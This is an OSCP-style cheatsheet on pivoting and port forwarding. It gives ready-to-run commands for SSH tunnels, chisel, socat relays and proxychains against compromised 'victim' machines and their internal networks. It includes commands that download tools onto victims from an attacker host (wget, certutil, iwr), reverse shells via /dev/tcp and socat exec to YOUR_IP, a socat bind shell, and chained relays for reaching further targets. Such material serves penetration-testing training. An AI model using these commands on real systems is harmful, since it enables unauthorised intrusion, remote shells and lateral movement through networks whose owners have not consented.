### Pivoting & Port Forwarding — OSCP Mega Cheatsheet

---

### Your Environment Setup (Do This First)

bash

```bash
# Start SSH server on kali
sudo systemctl start ssh

# Enable GatewayPorts for -R tunnels
# /etc/ssh/sshd_config
GatewayPorts yes
AllowTcpForwarding yes
sudo systemctl restart ssh

# Setup proxychains
# /etc/proxychains.conf  — bottom of file
socks5 127.0.0.1 1080

# Host chisel/socat for download
cd /opt && python3 -m http.server 80

# Upload chisel to victim (linux)
wget http://YOUR_IP/chisel && chmod +x chisel

# Upload chisel to victim (windows)
certutil -urlcache -f http://YOUR_IP/chisel.exe chisel.exe
iwr -uri http://YOUR_IP/chisel.exe -outfile chisel.exe
```

---

### Master Decision Tree

```
You have shell on victim. Need to reach something?
│
├─────────────────────────────────────────────────────────────┐
│  CAN you SSH into victim?                                   │
│                                                             │
│  YES (you SSH in)           NO (victim SSHes out to you)   │
│  ──────────────             ─────────────────────────────  │
│  One port needed?           One port needed?               │
│  → ssh -L                   → ssh -R (victim runs)         │
│                                                             │
│  Full network?              Full network?                  │
│  → ssh -D                   → ssh -R 1080 (victim runs)    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
          │
          │ No SSH at all?
          ▼
┌─────────────────────────────────────────────────────────────┐
│  Can you upload a binary?                                   │
│                                                             │
│  YES                        NO                             │
│  ────────────────           ──────────────────────────     │
│  Full network pivot?        Simple relay only?             │
│  → Chisel R:socks           → Socat TCP relay              │
│                                                             │
│  One port only?             Multi hop relay?               │
│  → Chisel R:PORT            → Socat chain                  │
│                                                             │
│  Relay shell through hop?                                  │
│  → Socat TCP-LISTEN fork                                   │
└─────────────────────────────────────────────────────────────┘
```

---

### SSH — All Four Scenarios

```
┌──────────────────────────────────────────────────────────────────────────┐
│  SCENARIO 1 — Local Port Forward                                         │
│  "Access ONE service on victim / internal host"                          │
│  YOU run this on YOUR kali                                               │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  ssh -L [LOCAL_PORT]:[DEST_IP]:[DEST_PORT] user@VICTIM                  │
│                                                                          │
│  # victim's own localhost service                                        │
│  ssh -L 8080:127.0.0.1:80 user@10.10.10.5                               │
│  → curl 127.0.0.1:8080    hits victim:80                                 │
│                                                                          │
│  # internal machine only victim can reach                                │
│  ssh -L 4445:192.168.1.20:445 user@10.10.10.5                           │
│  → smbclient //127.0.0.1/share -p 4445                                  │
│                                                                          │
│  # WinRM on internal host                                                │
│  ssh -L 5985:192.168.1.20:5985 user@10.10.10.5                          │
│  → evil-winrm -i 127.0.0.1 -u admin -p pass                             │
│                                                                          │
│  DEST IP is from VICTIM'S perspective, not yours                         │
└──────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│  SCENARIO 2 — Dynamic Port Forward (SOCKS)                               │
│  "Use victim as proxy for WHOLE internal network"                        │
│  YOU run this on YOUR kali                                               │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  ssh -D [SOCKS_PORT] user@VICTIM                                         │
│                                                                          │
│  ssh -D 1080 -N user@10.10.10.5                                          │
│                                                                          │
│  → proxychains nmap -sT -Pn 192.168.1.0/24                              │
│  → proxychains evil-winrm -i 192.168.1.20 -u admin -p pass              │
│  → proxychains crackmapexec smb 192.168.1.0/24                          │
│  → proxychains curl http://192.168.1.30                                  │
│                                                                          │
│  -N = no shell, just tunnel (cleaner)                                    │
└──────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│  SCENARIO 3 — Remote Port Forward                                        │
│  "Victim can't be SSHed into, pushes ONE port to you"                   │
│  VICTIM runs this                                                        │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  ssh -R [REMOTE_PORT]:[DEST_IP]:[DEST_PORT] kali@YOUR_IP                │
│                                                                          │
│  # expose victim's localhost service to your kali                        │
│  ssh -R 8080:127.0.0.1:80 kali@YOUR_IP                                  │
│  → curl 127.0.0.1:8080 on YOUR kali                                     │
│                                                                          │
│  # expose internal machine through victim                                │
│  ssh -R 4445:192.168.1.20:445 kali@YOUR_IP                              │
│  → smbclient //127.0.0.1/share -p 4445 on YOUR kali                     │
│                                                                          │
│  DEST IP is from VICTIM'S perspective                                    │
│  Port opens on YOUR kali                                                 │
└──────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│  SCENARIO 4 — Remote Dynamic (SOCKS)                                     │
│  "Victim can't be SSHed into, pushes FULL proxy to you"                 │
│  VICTIM runs this                                                        │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  ssh -R [SOCKS_PORT] kali@YOUR_IP                                        │
│                                                                          │
│  ssh -R 1080 -N kali@YOUR_IP                                             │
│                                                                          │
│  → proxychains nmap -sT -Pn 192.168.1.0/24                              │
│  → proxychains evil-winrm -i 192.168.1.20                               │
│  → proxychains crackmapexec smb 192.168.1.0/24                          │
│                                                                          │
│  Same result as -D but victim initiates the connection                   │
└──────────────────────────────────────────────────────────────────────────┘
```

---

### Chisel — All Four Scenarios

```
ALWAYS:
YOUR KALI  →  chisel server -p 9001 --reverse
VICTIM     →  chisel client YOUR_IP:9001 [tunnel]

┌──────────────────────────────────────────────────────────────────────────┐
│  SCENARIO 1 — Local Port Forward equivalent                              │
│  "Access ONE service on victim / internal host"                          │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  YOUR KALI:  chisel server -p 9001 --reverse                             │
│  VICTIM:     chisel client YOUR_IP:9001 R:8080:127.0.0.1:80             │
│                                                                          │
│  → curl 127.0.0.1:8080 on your kali                                     │
│                                                                          │
│  Internal host:                                                          │
│  VICTIM:     chisel client YOUR_IP:9001 R:4445:192.168.1.20:445         │
│  → smbclient //127.0.0.1/share -p 4445                                  │
│                                                                          │
│  R: = port opens on YOUR kali                                            │
│  Dest IP = from VICTIM perspective                                       │
└──────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│  SCENARIO 2 — Dynamic SOCKS proxy equivalent                             │
│  "Full network pivot through victim"                                     │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  YOUR KALI:  chisel server -p 9001 --reverse                             │
│  VICTIM:     chisel client YOUR_IP:9001 R:socks                          │
│                                                                          │
│  SOCKS5 proxy opens on YOUR kali 127.0.0.1:1080                         │
│                                                                          │
│  → proxychains nmap -sT -Pn 192.168.1.0/24                              │
│  → proxychains evil-winrm -i 192.168.1.20                               │
│  → proxychains crackmapexec smb 192.168.1.0/24                          │
│                                                                          │
│  Custom SOCKS port:                                                      │
│  VICTIM:  chisel client YOUR_IP:9001 R:2222:socks                       │
│  proxychains.conf → socks5 127.0.0.1 2222                               │
└──────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│  SCENARIO 3 — Multiple tunnels in ONE command                            │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  YOUR KALI:  chisel server -p 9001 --reverse                             │
│  VICTIM:     chisel client YOUR_IP:9001 \                                │
│              R:8080:127.0.0.1:80 \                                       │
│              R:3306:127.0.0.1:3306 \                                     │
│              R:socks                                                     │
│                                                                          │
│  All three tunnels active simultaneously                                 │
└──────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│  R: vs No R: — critical difference                                       │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  R:8080:127.0.0.1:80   →  port 8080 opens on YOUR kali  (use this 99%) │
│  8080:127.0.0.1:80     →  port 8080 opens on VICTIM                     │
└──────────────────────────────────────────────────────────────────────────┘
```

---

### Socat — All Scenarios

```
┌──────────────────────────────────────────────────────────────────────────┐
│  SCENARIO 1 — Expose victim's localhost service                          │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  # ON VICTIM                                                             │
│  socat TCP-LISTEN:8080,fork TCP:127.0.0.1:80                            │
│                                                                          │
│  → curl VICTIM_IP:8080 from your kali                                   │
└──────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│  SCENARIO 2 — Relay to internal host                                     │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  # ON VICTIM                                                             │
│  socat TCP-LISTEN:4445,fork TCP:192.168.1.20:445                        │
│                                                                          │
│  → smbclient //VICTIM_IP/share -p 4445 from your kali                   │
│  → crackmapexec smb VICTIM_IP:4445                                       │
└──────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│  SCENARIO 3 — Multi-hop relay chain                                      │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  You → Victim1 → Victim2 → Target                                        │
│                                                                          │
│  # ON VICTIM1                                                            │
│  socat TCP-LISTEN:8080,fork TCP:192.168.1.20:8080                       │
│                                                                          │
│  # ON VICTIM2                                                            │
│  socat TCP-LISTEN:8080,fork TCP:192.168.2.30:80                         │
│                                                                          │
│  → curl VICTIM1_IP:8080 reaches Target:80                               │
└──────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│  SCENARIO 4 — Relay reverse shell through hop                            │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  YOUR KALI:  nc -lvnp 4444                                               │
│  VICTIM1:    socat TCP-LISTEN:4444,fork TCP:YOUR_IP:4444                 │
│  TARGET:     bash -i >& /dev/tcp/VICTIM1_IP/4444 0>&1                   │
│                                                                          │
│  Shell arrives at your kali through victim1 relay                        │
└──────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│  SCENARIO 5 — Full TTY shell upgrade                                     │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  YOUR KALI:                                                              │
│  socat file:`tty`,raw,echo=0 TCP-LISTEN:4444                            │
│                                                                          │
│  VICTIM:                                                                 │
│  socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:YOUR_IP:4444   │
│                                                                          │
│  → Full TTY, tab complete, arrow keys, ctrl+c all work                  │
└──────────────────────────────────────────────────────────────────────────┘
```

---

### Proxychains Tips

bash

```bash
# Always use -sT with nmap (SYN scan does not work through SOCKS)
proxychains nmap -sT -Pn -p- 192.168.1.20

# Quiet mode — removes proxychains noise from output
proxychains -q nmap -sT -Pn 192.168.1.20

# Common tools through proxychains
proxychains evil-winrm -i 192.168.1.20 -u admin -p pass
proxychains crackmapexec smb 192.168.1.0/24
proxychains smbclient //192.168.1.20/share
proxychains curl http://192.168.1.20
proxychains mysql -h 192.168.1.20 -u root -p
proxychains xfreerdp /u:admin /p:pass /v:192.168.1.20

# Web browsing through proxy
# Firefox → Settings → Network → Manual Proxy
# SOCKS5   127.0.0.1   1080
```

---

### Full Comparison Table

```
┌──────────────────┬───────────────┬───────────────┬──────────────────────┐
│  FEATURE         │  SSH          │  CHISEL       │  SOCAT               │
├──────────────────┼───────────────┼───────────────┼──────────────────────┤
│  One port fwd    │  -L / -R      │  R:PORT       │  TCP-LISTEN:fork     │
│  SOCKS proxy     │  -D / -R 1080 │  R:socks      │  ✗ not supported     │
│  Multi-hop       │  complex      │  complex      │  ✅ simple chain      │
│  Shell relay     │  ✗            │  ✗            │  ✅ TCP-LISTEN fork   │
│  TTY upgrade     │  ✗            │  ✗            │  ✅ pty,setsid        │
│  Needs service   │  SSH daemon   │  nothing      │  nothing             │
│  Binary needed   │  NO           │  YES          │  YES                 │
│  Works Windows   │  needs setup  │  ✅ yes        │  ✅ yes               │
│  Encrypted       │  ✅ yes        │  ✅ yes        │  ✗ plaintext         │
│  Firewall bypass │  needs 22     │  ✅ HTTP/443   │  any open port       │
└──────────────────┴───────────────┴───────────────┴──────────────────────┘
```

---

### All Commands — One Place

bash

```bash
# ──────────────────────────────────────
# SSH
# ──────────────────────────────────────
ssh -L 8080:127.0.0.1:80 user@VICTIM          # local, victim localhost
ssh -L 8080:192.168.1.20:80 user@VICTIM       # local, internal host
ssh -D 1080 -N user@VICTIM                    # dynamic SOCKS you→victim
ssh -R 8080:127.0.0.1:80 kali@YOUR_IP         # remote, victim runs
ssh -R 1080 -N kali@YOUR_IP                   # remote dynamic, victim runs

# ──────────────────────────────────────
# CHISEL
# ──────────────────────────────────────
# your kali always runs server first
chisel server -p 9001 --reverse

chisel client YOUR_IP:9001 R:8080:127.0.0.1:80        # one port
chisel client YOUR_IP:9001 R:8080:192.168.1.20:80      # internal host
chisel client YOUR_IP:9001 R:socks                     # full SOCKS proxy
chisel client YOUR_IP:9001 R:2222:socks                # custom SOCKS port
chisel client YOUR_IP:9001 R:8080:dst:80 R:socks       # multiple tunnels

# ──────────────────────────────────────
# SOCAT
# ──────────────────────────────────────
socat TCP-LISTEN:8080,fork TCP:127.0.0.1:80            # expose localhost
socat TCP-LISTEN:4445,fork TCP:192.168.1.20:445        # relay to internal
socat TCP-LISTEN:4444,fork TCP:YOUR_IP:4444            # relay reverse shell
socat TCP-LISTEN:4444,fork EXEC:/bin/bash              # bind shell
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444            # TTY listener
socat exec:'bash -li',pty,stderr,setsid,sigint,sane \
      TCP:YOUR_IP:4444                                  # TTY reverse shell

# ──────────────────────────────────────
# PROXYCHAINS
# ──────────────────────────────────────
proxychains -q nmap -sT -Pn -p 22,80,443,445,3389,5985 192.168.1.20
proxychains -q nmap -sT -Pn -p- 192.168.1.20
proxychains evil-winrm -i 192.168.1.20 -u admin -p pass
proxychains crackmapexec smb 192.168.1.0/24
proxychains smbclient //192.168.1.20/share
proxychains curl http://192.168.1.20
```

---

### OSCP Exam Quick Reference

```
Got shell on Linux victim, service on localhost?
→ ssh -L 8080:127.0.0.1:SERVICE user@VICTIM

Got shell on Linux victim, need whole subnet?
→ ssh -D 1080 -N user@VICTIM  +  proxychains

Got shell on Windows victim, need whole subnet?
→ upload chisel.exe
→ chisel server -p 9001 --reverse       (your kali)
→ chisel client YOUR_IP:9001 R:socks    (victim)
→ proxychains

Need to relay reverse shell through hop?
→ socat TCP-LISTEN:4444,fork TCP:YOUR_IP:4444   (on hop)
→ nc -lvnp 4444                                  (your kali)

Need to reach internal host, no proxy available?
→ socat TCP-LISTEN:PORT,fork TCP:INTERNAL_IP:PORT   (on victim)
→ connect to VICTIM_IP:PORT from your kali

Stuck with basic shell, want full TTY?
→ socat file:`tty`,raw,echo=0 TCP-LISTEN:4444        (your kali)
→ socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:YOUR_IP:4444
```